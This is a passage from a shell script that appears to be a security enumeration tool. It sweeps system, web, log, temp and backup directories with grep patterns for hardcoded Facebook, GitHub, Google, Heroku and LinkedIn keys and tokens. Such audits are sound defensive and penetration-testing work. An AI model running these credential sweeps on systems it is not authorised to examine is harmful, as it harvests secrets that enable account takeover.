  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Facebook Oauth (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Facebook Secret Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Github (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Google API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "AIza[0-9A-Za-z_\-]{35}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Google Cloud Platform API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Google Drive Oauth (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Google Oauth Access Token (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "ya29\.[0-9A-Za-z_\-]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Heroku API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching LinkedIn Client ID (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
